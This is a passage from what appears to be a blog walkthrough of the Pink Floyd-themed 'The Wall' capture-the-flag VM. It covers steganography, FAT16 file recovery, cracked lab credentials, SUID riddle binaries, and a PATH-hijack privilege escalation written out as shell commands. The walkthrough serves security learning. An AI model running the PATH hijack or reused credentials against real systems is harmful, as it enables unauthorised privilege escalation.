               &lt;pc&gt;&lt;p&gt;pinkfloydrocks&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;steghide&quot;&gt;Steghide&lt;/h2&gt;

&lt;p&gt;Install steghide on kali: &lt;code&gt;apt-get install -y steghide&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The steghide command &lt;code&gt;steghide extract -sf pink_floyd.jpg&lt;/code&gt; was used to extract data from images with hidden
information retained within them (steganography). Entering the previously
cracked password &lt;code&gt;divisionbell&lt;/code&gt; disclosed another message containing
a &lt;strong&gt;base64&lt;/strong&gt; encoded string and another &lt;strong&gt;md5&lt;/strong&gt; hash.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Username&lt;/th&gt;
      &lt;th&gt;Password&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;SydBarrett&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;divisionbell&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;sftp-login&quot;&gt;SFTP Login&lt;/h2&gt;

&lt;p&gt;The discovered account credentials above allowed access to an SFTP server on
the target machine.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .mail/.stash/
sftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;eclipsed_by_the_moon
sftp&amp;gt; get eclipsed_by_the_moon&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The file &lt;code&gt;eclipsed_by_the_moon&lt;/code&gt; was downloaded for further
investigation.&lt;/p&gt;

&lt;h2 id=&quot;fatcat-fat16-forensics-tool&quot;&gt;Fatcat FAT16 Forensics Tool&lt;/h2&gt;

&lt;p&gt;The &lt;code&gt;file&lt;/code&gt; command was leveraged  to disclose the following information about the
previously retrived file &lt;code&gt;ecslipsed_by_the_moon&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID
&lt;span class=&quot;s2&quot;&gt;&quot;MSDOS5.0&quot;&lt;/span&gt;, sectors/cluster 2, reserved sectors 8, root entries 512, Media
descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors
2048, sectors 96256 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;volumes &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 32 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; , serial number 0x9e322180, unlabeled,
FAT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16 bit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Research discovered &lt;strong&gt;Fatcat&lt;/strong&gt; a forensics tool used for
recovering / extracting data from FAT16 images.&lt;/p&gt;

&lt;p&gt;The following command was used to extract a deleted image file from the FAT16
disk image:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;fatcat ~/Desktop/eclipsed_by_the_moon.lsd &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /rogerwaters.jpg &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; rogerwaters.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Viewing the image disclosed the users password:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/thewall/rogerwaters.jpg&quot; alt=&quot;Roger Waters - Pink Floyd - The Wall&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ssh-shell&quot;&gt;SSH Shell&lt;/h2&gt;

&lt;p&gt;A non privileged SSH shell was established using the previously discovered
credentials.&lt;/p&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;Username format&lt;/h5&gt;
   &lt;p&gt;The uppercase characters in the username were guessed from the previous username pattern. &lt;/p&gt;
&lt;/div&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Username&lt;/th&gt;
      &lt;th&gt;Password&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;RogerWaters&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;hello_is_there_anybody_in_there&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;local-system-enumeration&quot;&gt;Local System Enumeration&lt;/h2&gt;

&lt;h3 id=&quot;account-rogerwaters&quot;&gt;Account: RogerWaters&lt;/h3&gt;

&lt;p&gt;Enumeration of the system discovered the SUID binary: &lt;code&gt;/usr/local/bin/brick&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Running the suid binary and answering the question correctly with &lt;code&gt;Nick Mason&lt;/code&gt; change the current user to “NickMason”.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/brick

What have we here, laddie?
Mysterious scribbings?
A secret code?
Oh, poems, no less!
Poems everybody!

Who is the only band member to be featured on every Pink Floyd album? : Nick
Mason
/bin/sh: Cannot determine current working directory
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NickMason&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NickMason&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RogerWaters&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;account-nickmason&quot;&gt;Account: NickMason&lt;/h3&gt;

&lt;p&gt;Local enumeration of &lt;code&gt;nick_mason_profile_pic.jpg&lt;/code&gt; discovered the file was an .ogg audio file containing morsecode data.&lt;/p&gt;

&lt;h4 id=&quot;extracting-morse-code-data&quot;&gt;Extracting Morse Code Data&lt;/h4&gt;

&lt;p&gt;The ogg file contained morse code data with music playing at the same time over
both stereo channels.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Audacity&lt;/strong&gt; was used with a low high pass filter to help remove as much of the
lower frequency music as possible, making the higher frequency morse code tones
easier to hear.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/thewall/audacity.png&quot; alt=&quot;Audacity Morse Code Low Pass Filter&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sonic Visualiser&lt;/strong&gt; was used in addition to help visualise the morse code dots and
dashes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/thewall/morse-code.png&quot; alt=&quot;Sonic Visualiser Morse Code&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;morse-code-decoded&quot;&gt;Morse Code Decoded&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Morse Code&lt;/th&gt;
      &lt;th&gt;Character&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;.-.&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;b&gt;R&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;..&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;b&gt;I&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;-.-.&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;C&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;
        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;....&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;H&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;
        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;.-&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;A&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;
        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;.-.&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;R&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;
        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;-..&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;D&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;
        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;.--&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;W&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;
        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;.-.&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;R&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;
        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;..&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;I&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;
        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;--.&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;G&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;
        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;....&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;H&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;
        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;-&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;T&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;
        &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;.---- &lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;1&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;

      &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;----.&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;9&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;

      &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;....-&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;4&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;

      &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;...--&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;3&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;

    &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;..-.&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;F&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;

    &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;.-&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;A&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;

    &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;.-.&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;R&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;

    &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;..-.&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;F&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;

    &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;..&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;I&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;

    &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;...&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;S&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;

    &lt;tr&gt;
              &lt;td&gt;
                   &lt;pc&gt;&lt;p&gt;&lt;code&gt;.-&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
              &lt;/td&gt;
             &lt;td&gt;
             &lt;pc&gt;&lt;p&gt;&lt;b&gt;A&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
             &lt;/td&gt;
       &lt;/tr&gt;

      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;discovered-credentials&quot;&gt;Discovered Credentials&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Username&lt;/th&gt;
      &lt;th&gt;Password&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;RichardWright&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;1943farfisa&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;account-richardwright&quot;&gt;Account: RichardWright&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;su - RichardWright&lt;/code&gt; was possible using the above credentials.&lt;/p&gt;

&lt;p&gt;Local enumeration discovered the SUID binary
&lt;code&gt;/usr/local/bin/shineon&lt;/code&gt;, running the binary through
&lt;code&gt;strings&lt;/code&gt; discovered it called the program &lt;code&gt;mail&lt;/code&gt; without
specifying the absolute path.&lt;/p&gt;

&lt;p&gt;Strings output:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;load_menu
Time - The Dark Side of the Moon
/usr/bin/cal
Press ENTER to &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Echoes - Meddle
/usr/bin/who
Is There Anybody Out There? - The Wall
/sbin/ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 3 www.google.com
Keep Talking- The Division Bell
mail&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;path-manipulation&quot;&gt;PATH Manipulation&lt;/h3&gt;

&lt;p&gt;The following file was created:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/mail&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Changed directory to &lt;code&gt;/tmp&lt;/code&gt; and PATH set to .&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Execution of option 4 executed the mail script successfully.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1003&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RichardWright&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1004&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DavidGilmour&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1003&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RichardWright&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1003&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RichardWright&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;account-davidgilmour&quot;&gt;Account: DavidGilmour&lt;/h3&gt;

&lt;p&gt;With euid set, enumeration of DavidGimours home dir was possible.&lt;/p&gt;

&lt;p&gt;Running strings on &lt;code&gt;david_gilmour_profile.jpg&lt;/code&gt; revealed the users
password.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/strings david_gilmour_profile_pic.jpg

|Mvk
7OnN&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Nn_&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
^&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;W
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;w|6
Om?OoA
who_are_you_and_who_am_i&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;URL also disclosed via Apache config&lt;/h5&gt;
  &lt;p&gt;The web app URL was also disclosed at &lt;code&gt;/etc/httpd.conf.orig&lt;/code&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;Viewing  &lt;code&gt;anotherbrick.txt&lt;/code&gt; revealed the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# cat /home/DavidGilmour/anotherbrick.txt&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Come on you raver, you seer of visions, come on you painter, you piper, you&lt;/span&gt;
prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond

New website &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;review:
pinkfloyd1965newblogsite50yearscelebration-temp/index.php

&lt;span class=&quot;c&quot;&gt;# You have to be trusted by the people you lie to. So that when they turn their&lt;/span&gt;
backs on you, you&lt;span class=&quot;s1&quot;&gt;'ll get the chance to put the knife in. - Pink Floyd, Dogs
#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;web-application-enumeration&quot;&gt;Web Application Enumeration&lt;/h2&gt;

&lt;p&gt;Enumeration of the above web application exposed a code comment riddle:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--Through&lt;/span&gt; the window &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the wall, come streaming &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;on sunlight wings, a
million bright ambassadors of morning. - Pink Floyd, Echoes
Can you see what the Dog sees? Perhaps hints of lightness streaming &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;on
sunlight wings?--&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The area of the image near the dog revealed some text strings. Using
&lt;strong&gt;Image Magik&lt;/strong&gt; the brightness was increased to dislcose the strings
&lt;code&gt;/welcometothemachine&lt;/code&gt; and
&lt;code&gt;50696e6b466c6f796435305965617273&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/thewall/brighter.jpg&quot; alt=&quot;Image Magik Brightness Increase&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;root-shell&quot;&gt;Root Shell&lt;/h2&gt;

&lt;p&gt;Searching for the string &lt;code&gt;welcomethemachine&lt;/code&gt; discovered the
following binary &lt;code&gt;/var/www/htdocs/welcometothemachine/PinkFloyd&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./PinkFloyd
Please send your answer to Old Pink, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;care of the Funny Farm. - Pink Floyd,
Empty Spaces
Answer: 50696e6b466c6f796435305965617273

Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless

Congratulations... permission has been granted.
You can now &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;your controls to the heart of the sun!
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Password:
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;DavidGilmour on thewall:
    env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK&quot;&lt;/span&gt;

User DavidGilmour may run the following commands on thewall:
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SETENV: ALL
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SETENV: ALL
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SETENV: ALL
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SETENV: ALL
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;DavidGilmour
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1004&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DavidGilmour&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1004&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DavidGilmour&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
